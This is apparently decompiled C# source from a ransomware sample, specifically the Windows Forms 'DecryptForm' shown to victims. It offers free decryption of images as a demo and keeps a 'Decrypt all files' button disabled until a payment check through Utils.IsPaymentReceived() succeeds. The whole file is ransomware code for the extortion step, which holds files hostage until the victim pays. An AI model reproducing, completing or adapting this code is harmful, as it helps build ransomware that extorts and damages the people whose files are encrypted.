using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace wg;

public class DecryptForm : Form
{
	private IContainer components;

	private Button DecryptDemo;

	private Button DecryptAll;

	public DecryptForm()
	{
		InitializeComponent();
		if (Utils.IsPaymentReceived())
		{
			((Control)DecryptAll).set_Text("Decrypt all files");
			((Control)DecryptAll).set_Enabled(true);
		}
	}

	private void DecryptDemo_Click(object sender, EventArgs e)
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		Utils.Decrypt(demo: true);
		MessageBox.Show((IWin32Window)(object)this, "Images decrypted!", "Done", (MessageBoxButtons)0, (MessageBoxIcon)48);
		((Form)this).Close();
	}

	private void DecryptAll_Click(object sender, EventArgs e)
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		Utils.Decrypt(demo: false);
		MessageBox.Show((IWin32Window)(object)this, "Files decrypted!", "Done", (MessageBoxButtons)0, (MessageBoxIcon)48);
		((Form)this).Close();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		DecryptDemo = new Button();
		DecryptAll = new Button();
		((Control)this).SuspendLayout();
		((Control)DecryptDemo).set_Location(new Point(12, 30));
		((Control)DecryptDemo).set_Name("DecryptDemo");
		((Control)DecryptDemo).set_Size(new Size(155, 48));
		((Control)DecryptDemo).set_TabIndex(0);
		((Control)DecryptDemo).set_Text("Decrypt images (Free)");
		((ButtonBase)DecryptDemo).set_UseVisualStyleBackColor(true);
		((Control)DecryptDemo).add_Click((EventHandler)DecryptDemo_Click);
		((Control)DecryptAll).set_Enabled(false);
		((Control)DecryptAll).set_Location(new Point(173, 30));
		((Control)DecryptAll).set_Name("DecryptAll");
		((Control)DecryptAll).set_Size(new Size(155, 48));
		((Control)DecryptAll).set_TabIndex(1);
		((Control)DecryptAll).set_Text("Decrypt all files \r\n(Will available after payment)");
		((ButtonBase)DecryptAll).set_UseVisualStyleBackColor(true);
		((Control)DecryptAll).add_Click((EventHandler)DecryptAll_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(340, 119));
		((Control)this).get_Controls().Add((Control)(object)DecryptAll);
		((Control)this).get_Controls().Add((Control)(object)DecryptDemo);
		((Form)this).set_FormBorderStyle((FormBorderStyle)3);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("DecryptForm");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)4);
		((Control)this).set_Text("Decrypt files");
		((Control)this).ResumeLayout(false);
	}
}
